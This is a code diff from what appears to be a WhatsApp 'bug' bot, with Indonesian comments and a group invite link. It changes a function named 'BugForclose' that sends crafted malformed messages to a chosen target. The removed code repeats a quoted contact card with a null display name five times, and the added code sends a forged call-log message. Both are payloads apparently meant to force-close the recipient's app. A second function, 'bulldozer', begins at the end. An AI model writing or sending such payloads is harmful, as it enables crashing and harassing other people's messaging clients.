@@ -2008,23 +2008,25 @@ https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
 THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
 */
 async function BugForclose(target) {
-    for (let i = 0; i < 5; i++) {
-        await kipop.relayMessage(target, {
-            "extendedTextMessage": {
-                "text": "Hai Sayang🦍",
-                "contextInfo": {
-                    "stanzaId": generateMessageID(),
-                    "participant": target,
-                    "quotedMessage": {
-                        "contactMessage": {
-                            "displayName": "\u0000",
-                            "vcard": "BEGIN:VCARD\nVERSION:3.0\nFN:Reyhan6610\nX-WA-BIZ-NAME:Reyhan6610\n\nORG:Reyhan6610;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
-                        }
-                    }
+    await kipop.relayMessage(target, {
+        extendedTextMessage: {
+            text: 'oi',
+            contextInfo: {
+                stanzaId: "1234567890Konto𝐦𝐞𝐦𝐞𝐤n",
+                participant: "5521992999999@s.whatsapp.net",
+                callLogMessage: {
+                    isVideo: true,
+                    callOutcome: "1",
+                    durationSecs: "0",
+                    callType: "REGULAR",
+                    participants: [{
+                        jid: "5521992999999@s.whatsapp.net",
+                        callOutcome: "1"
+                    }]
                 }
             }
-        }, {})
-    }
+        }
+    }, {});
 }
 async function bulldozer(isTarget) {
   let message = {
